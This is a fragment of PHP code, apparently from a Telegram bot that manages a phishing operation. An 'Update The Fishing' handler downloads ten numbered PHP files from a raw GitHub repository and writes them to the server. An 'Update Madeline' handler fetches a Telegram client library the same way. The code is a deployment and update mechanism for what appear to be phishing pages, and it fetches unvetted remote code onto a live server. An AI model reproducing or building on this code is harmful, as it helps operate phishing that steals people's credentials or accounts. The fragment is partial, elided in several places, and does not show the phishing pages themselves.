...
[["text" =>"↬Run or Stop Turbo"],["text" =>"↬ Ping"]],
...
if($text == "↬ Update The Fishing"){
	...
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/1.php");
	file_put_contents("1.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/2.php");
	file_put_contents("2.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/3.php");
	file_put_contents("3.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/4.php");
	file_put_contents("4.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/5.php");
	file_put_contents("5.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/6.php");
	file_put_contents("6.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/7.php");
	file_put_contents("7.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/8.php");
	file_put_contents("8.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/9.php");
	file_put_contents("9.php",$up_file);
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/10.php");
...
if($text == "↬ Update Madeline"){
	...
	$up_file = curl_get("https://raw.githubusercontent.com/wqrqwfqw/xn/main/madeline.php");
